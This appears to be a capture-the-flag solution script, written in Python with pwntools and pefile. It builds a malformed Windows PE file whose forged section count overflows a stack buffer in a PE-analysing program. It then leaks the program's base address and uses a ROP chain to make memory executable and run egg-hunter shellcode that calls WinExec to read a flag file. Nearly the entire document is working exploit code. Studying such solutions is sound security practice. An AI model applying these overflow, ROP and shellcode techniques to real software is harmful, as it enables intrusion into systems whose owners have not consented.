from pwn import *
import pefile
import requests
import base64

context.arch = "amd64"
context.os = "windows"

SUBMIT_URL = f"http://127.0.0.1:8080/submit"

INPUT_FILE = "./dummy.exe"
OUTPUT_FILE = "./evil.exe"

EGG = b"corctf"
assert len(EGG) < 8

CMD = r"cmd.exe /c type C:\Users\coruser\Desktop\flag.txt && exit"
SC = shellcraft.amd64.windows.winexec(CMD)
log.info(f"shellcode: {SC}")
SC = asm(SC)

def add_section(section_name, section_data, stop=False):
    global PE_BUF

    assert len(section_name) <= 8
    pe = pefile.PE(data=PE_BUF)

    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment

    size_in_memory = len(section_data)
    size_in_file = len(section_data)

    for section in pe.sections:
        section.PointerToRawData += 40
        section.VirtualAddress += 40
    pe.OPTIONAL_HEADER.SizeOfHeaders += 40

    last_section = pe.sections[-1]

    new_section_rva = last_section.VirtualAddress + last_section.Misc_VirtualSize
    new_section_offset = last_section.PointerToRawData + last_section.SizeOfRawData

    section_hdr_off = pe.sections[-1].get_file_offset() + 40
    section_hdr = b""
    section_hdr += section_name.ljust(8, b"\x00")   # .Name
    section_hdr += p32(size_in_memory)              # .Misc.VirtualSize
    section_hdr += p32(new_section_rva)             # .VirtualAddress
    if not stop:
        section_hdr += p32(size_in_file)            # .SizeOfRawData
        section_hdr += p32(new_section_offset)      # .PointerToRawData
    else:
        section_hdr += p32(0xffffffff)
        section_hdr += p32(0xffffffff)
    section_hdr += p32(0)                           # .PointerToRelocations
    section_hdr += p32(0)                           # .PointerToLineNumbers
    section_hdr += p16(0)                           # .NumberOfRelocations
    section_hdr += p16(0)                           # .NumberOfLinenumbers
    section_hdr += p32(0)                           # .Characteristicts
    
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = new_section_rva + size_in_memory

    new = pe.write()
    PE_BUF = new[:section_hdr_off] + section_hdr + new[section_hdr_off:]
    PE_BUF += section_data

def send_pe(filename):
    if args.REMOTE:
        with open(filename, "rb") as f:
            files = {"PE": f}
            r = requests.post(SUBMIT_URL, files=files)
            return base64.b64decode(r.content)
    else:
        try:
            p = subprocess.run(["main.exe", filename], capture_output=True, timeout=5)
        except subprocess.TimeoutExpired:
            log.warning("Process timeout expired")
            return b""
        return p.stdout

def write_evil(filename):
    global PE_BUF

    pe = pefile.PE(data=PE_BUF)
    # bug, NumberOfSections = -1, will overflow alloca() size
    pe.FILE_HEADER.NumberOfSections = 0xffff
    PE_BUF = pe.write()

    with open(filename, "wb") as f:
        f.write(PE_BUF)

def chk(addr):
    for i in range(6):
        if (addr >> (i * 8)) & 0xff == 0:
            raise Exception(f"Null byte in a gadget address ({hex(addr)})")
    return addr

def do_write(addr, value=None):
    add_section(p64(pop_rbp), high_entropy)
    add_section(p64(chk(addr + 0x10)), high_entropy)
    if value != None:
        add_section(p64(pop_rax), high_entropy)
        add_section(p64(value) if not isinstance(value, bytes) else value, high_entropy)
        add_section(b"\x00", high_entropy)
    add_section(p64(write_gadget), high_entropy)
    
    # pad for add rsp, 0x80; pop rbp
    for _ in range(0x10 + 1):
        add_section(b"\x00", high_entropy)

high_entropy = bytes.fromhex("0198da49c9237a859f775606cdb3c3cf4437844e3afff7b1050a78a33034db87da86cf365faeac75403941289511c81aeedcf99f086ca3bf338942fbb84473ed7f433f1f11417156810e8ffdf654a2d84f2f8e5b6c569161dc7a97f015b65284960455012a99dc127f8892d7574db5eb35272553b3743307301baf961eb92f3e4620cf15dc09372ade7244a4c0ea438022dcca8884effc6f44873bf2ca9f76cbb1cdacb1243a08c525e51e35c076bc9b74d8e16b889923bcb90e17f63d5bece2bd583dc1124160555a6331f32b02fece46715875dcf9066d0c0432dbb5ae61b76f2850a04b31a408c6f3b355377ea832dac2257a5d580df858252d939c1ceb2fd8552d5d19d37090d0fc8e0034254c8ba3b15dec22fa7ce8e196cfa5796086fa22579fc8d8286d18932f1e07270dc2913a5cbbede016cac8d14aee5b9285951290e3cf582e9e66c477446db6be2c4542f7ae650c926360d6910f0dba92ee79497e20d39d7368d196ed5eace13d948bf2aac34391004576157cceca83e9f920a6828a5969915a32b65244cfac97af72807dc2816598815600782c625a7b9fa7ff03790d481c45d838fb44b3f52d425f1cfb97887e6db8fa0a715d9027865419f682e611a43d1871dee5908e6fdd296b2d5e6ec3bbadb62369b972e00eabfcff1dc9fb5f7cfd342cf43d8dd7704a045f66e7253eba54df45020a857cba13b74205483fa197bbb3241d5746a4940e4c0ed046d762947624e8e04157bdf48f278c28d0ceca63707d3a1264586b8340b99db0dae1b32a93ab10161e162b560862a58dcc2308c62f3aed1925c483137fbcc89c9609ac80cbb809848cd1b9a0d0328507d415b79c30c228e044e6bef84c14e74de2608e03b52b5b3dcf1a64b19c275e585bfc4b27346273ad7db8fd7771db384945df10bf466d996cccedbf7f8b493002144f941db5b53cd5d47428f0f217c6f855dcbc1230df32194a1b455a21def1f8d1113882b0b7c8bbc8a0c7500d4b29ccef5668e3729f381e375de0ae6b0ab642975476364d6bfa585dccf45b29dd974ad6fa03039c57d8c4ea4dcc7a5015e4a93a03ab07c6007f269baf8c1444b76a857458170ad6be6cd11cfb2e9dfc14257c701be96cf3c370cab69c0ebb770e08b878bbd7598b5c6bf22128d91f083a38bf15902e3187a5ae766a9864b45e46a04b5ad46964bddd6955b3add56de3ecb19b48ebd3d5f181e3bfaca25f3880bce3f011c00fe292c13e09db9fe09ab00dd8b04b704648fbc6f4eef7d632d1982d46cc4aa75999f917dfb3b62285e0e6b0bed03e93d6ee28afee7794eecd026c709713e120d820d53f07554b628c4136c22422249bbabe1cb0230fde8386d81e2cc53f0b1ebd259e98cb3ed20304ca1b776b6584ebda3cd3ce225cb31e44e7a96bf05568b4f7136c1e569280d6ea8292a61298")

log.info("Step 1. Leak PE address")

with open(INPUT_FILE, "rb") as f:
    PE_BUF = f.read()

for i in range(5):
    add_section(b"\x00", high_entropy)

# overwrite heCount with a larger value to leak addresses from the stack
add_section(p32(70), high_entropy)

add_section(b".stop", b"\x00" * 512, True) # avoids crash in calculate_entropy()

write_evil(OUTPUT_FILE)
leaks = send_pe(OUTPUT_FILE).split(b"[!] Sections ")[1].split(b" have high")[0].split(b", ")
pe_leak = u64(leaks[15].ljust(8, b"\x00"))
PE_BASE = pe_leak - 0x2412
log.success(f"\tPE leak: {hex(pe_leak)}")
log.info(f"\tPE base: {hex(PE_BASE)}")

assert pe_leak & 0xffff7f0000000000 == 0x00007f0000000000 and PE_BASE & 0xffff000000000000 == 0

pop_rcx = chk(PE_BASE + 0x3ce0)
pop_rbp = chk(PE_BASE + 0x1015)
pop_rax = chk(PE_BASE + 0x3cdf) # pop rax; pop rcx; ret
pop_rdi = chk(PE_BASE + 0x1863) # pop rdi; pop rbp; ret
call_rdi = chk(PE_BASE + 0x1626)

# 0x0000000140002ef7 : mov qword ptr [rbp - 0x10], rax ; jmp 0x140003171
write_gadget = chk(PE_BASE + 0x2ef7)

get_proc_heap = chk(PE_BASE + 0x4240)

# exit(0)

print()
log.info(f"Step 2. Make heap and .bss RWX, execute both shellcodes")

with open(INPUT_FILE, "rb") as f:
    PE_BUF = f.read()

# add command section to the file
add_section(b".sc", EGG.ljust(8, b"\x00") + SC)

for i in range(5):
    add_section(b"\x00", high_entropy)

# overwrite heCount to the index of return address skipping the canary
add_section(p32(0x10 - 1), high_entropy)

# overwrite return address with rop chain

add_section(p64(get_proc_heap), high_entropy)

# skip canary
add_section(p64(pop_rcx), high_entropy)
add_section(b"\x00", high_entropy)

do_write(PE_BASE + 0xb210 + 0x8) # the_secs[0].sec_start = GetProcessHeap()

do_write(PE_BASE + 0xb100, PE_BASE + 0xb210) # the_secs = .bss + 0x210
do_write(PE_BASE + 0xb210, 0x40) # the_secs[0].old_protect = PAGE_EXECUTE_READWRITE
do_write(PE_BASE + 0xb210 + 0x10, 0x4ffff) # dwSize

do_write(PE_BASE + 0xb210 + 0x28 + 8, PE_BASE + 0xb310) # the_secs[1].sec_start = .bss + 0x310
do_write(PE_BASE + 0xb210 + 0x28, 0x40) # the_secs[1].old_protect = PAGE_EXECUTE_READWRITE
do_write(PE_BASE + 0xb210 + 0x28 + 0x10, 0x50) # dwSize

do_write(PE_BASE + 0xb108, 2) # maxSections

# dec rcx ; fix egg
#
# find_sc_and_jmp:
#   inc rax
#   cmp qword ptr [rax], rcx
#   jne short find_sc_and_jmp
#   add rax, 8
#   jmp rax
do_write(PE_BASE + 0xb310, b"\x48\xff\xc9\x48\xff\xc0\x48")
do_write(PE_BASE + 0xb310 + 7, b"\x39\x08\x75\xf8\x48\x83\xc0")
do_write(PE_BASE + 0xb310 + 7 * 2, b"\x08\xff\xe0")

add_section(p64(PE_BASE + 0x2cdf), high_entropy) # restore_modified_sections()

# rax = GetProcessHeap()
# rcx = EGG
# rdi = &initial shellcode
# call rdi
add_section(p64(get_proc_heap), high_entropy)
add_section(p64(pop_rcx), high_entropy)
add_section(p8(EGG[0] + 1) + EGG[1:], high_entropy) # section.Name, + 1 so find_sc_and_jmp skips this
add_section(p64(pop_rdi), high_entropy)
add_section(p64(PE_BASE + 0xb310), high_entropy) # egg finding shellcode
add_section(b"\x00", high_entropy) # rbp
add_section(p64(call_rdi), high_entropy)

add_section(b".stop", b"\x00" * 512, True) # avoids crash in calculate_entropy()

write_evil(OUTPUT_FILE)

while True:
    log.info(f"Sending WinExec(\"{CMD}\") payload...")
    resp = send_pe(OUTPUT_FILE)
    if b"corctf{" in resp:
        flag = resp.split(b"corctf{")[1].split(b"}\n")[0].decode()
        log.success(f"Exploit success: corctf{{{flag}}}")
        break
